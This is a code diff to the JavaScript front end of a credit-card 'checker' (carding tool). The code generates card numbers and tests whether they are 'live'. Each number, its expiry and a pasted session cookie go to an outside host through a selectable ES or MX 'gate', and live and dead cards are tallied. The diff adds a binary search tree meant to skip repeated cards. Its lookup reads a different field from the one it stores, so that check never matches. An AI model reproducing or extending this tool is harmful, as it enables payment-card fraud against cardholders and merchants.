@@ -120,13 +120,73 @@ particlesJS('particles-js',
 
 );
 
+class Node {
+  constructor(value) {
+    this.value = value;
+    this.left = null;
+    this.right = null;
+  }
+}
+
+class BinarySearchTree {
+  constructor() {
+    this.root = null;
+  }
+
+  insert(value) {
+    const node = new Node(value);
+    if (!this.root) {
+      this.root = node;
+      return this;
+    }
+    let current = this.root;
+    while (true) {
+      if (value === current.value) return undefined;
+      if (value < current.value) {
+        if (!current.left) {
+          current.left = node;
+          return this;
+        }
+        current = current.left;
+      } else {
+        if (!current.right) {
+          current.right = node;
+          return this;
+        }
+        current = current.right;
+      }
+    }
+  }
+
+  contains(value) {
+    if (!this.root) return false;
+    let current = this.root;
+    while (current) {
+      if (value === current.value) return true;
+      if (value < current.value) {
+        current = current.left;
+      } else {
+        current = current.right;
+      }
+    }
+    return false;
+  }
+}
 
 initComponents();
 document.querySelector('#btn-generar').addEventListener('click',generarTarjetas);
-document.querySelector('#btn-buscar').addEventListener('click',buscarLives);
+document.querySelector('#btn-buscar-ES').addEventListener('click',()=>{
+  buscarLives("ES");
+});
+document.querySelector('#btn-buscar-MX').addEventListener('click',()=>{
+  buscarLives("MX");
+});
 let lives_cont = 0;
 let dead_cont = 0;
+let error_cont = 0;
 let tarjetas = [];
+
+const arbol = new BinarySearchTree();
 
 function generarTarjetas(){
     let num = document.querySelector("#gen-num").value;
@@ -154,13 +214,16 @@ function generarTarjetas(){
     }
 }
 
-async function buscarLives(){
+async function buscarLives(gate){
     let cookie = document.querySelector('#cookie').value;
     let pEstado = document.querySelector('#p-estado');
     let lives = document.querySelector('#lives');
     let dead = document.querySelector('#dead');
     let hlives = document.querySelector("#lives-cont");
     let hdead = document.querySelector('#dead-cont');
+    let herror = document.querySelector("#error-cont");
+    let error = document.querySelector("#eror");
+
 
     if(!cookie){
         alert("Sin cookie es imposible buscar lives");
@@ -179,8 +242,17 @@ async function buscarLives(){
     for(let i = 0; i < tarjetas.length; ++i){
         pEstado.textContent = "Probando ("+(i+1)+"/"+tarjetas.length+"): " + tarjetas[i].numero + '│' + tarjetas[i].mes + '│' + tarjetas[i].anyo + '│' + tarjetas[i].cvv;
 
-        let url = `https://aaroncc.pythonanywhere.com/?numero=${tarjetas[i].numero}&mes=${tarjetas[i].mes}&anyo=${tarjetas[i].anyo}&cookie=${cookie}`;
+        let url = `https://aaroncc.pythonanywhere.com/?numero=${tarjetas[i].numero}&mes=${tarjetas[i].mes}&anyo=${tarjetas[i].anyo}&cookie=${cookie}&gate=${gate}`;
         
+        if(arbol.contains(parseInt(tarjetas[i].num)) == true){
+          console.log('entre');
+            p = document.createElement('p');
+            p.textContent = tarjetas[i].numero + '│' + tarjetas[i].mes + '│' + tarjetas[i].anyo + '│' + tarjetas[i].cvv + " Tarjeta Repetida";
+            error.appendChild(p);
+            error_cont++;
+            herror.textContent = "ERROR (" + error_cont + ")";
+            break;
+        }
         try{
           const response = await fetch(url);
           const data = await response.json();
@@ -199,8 +271,10 @@ async function buscarLives(){
             dead_cont++;
             hdead.textContent = "DEAD (" + dead_cont + ")";
           }
-        }catch(error){
 
+          arbol.insert(parseInt(tarjetas[i].numero));
+
+        }catch(error){
           alert("El proceso finalizó debido a un error: Verifica que tu cookie no tenga tarjetas asociadas");
           break;
         }
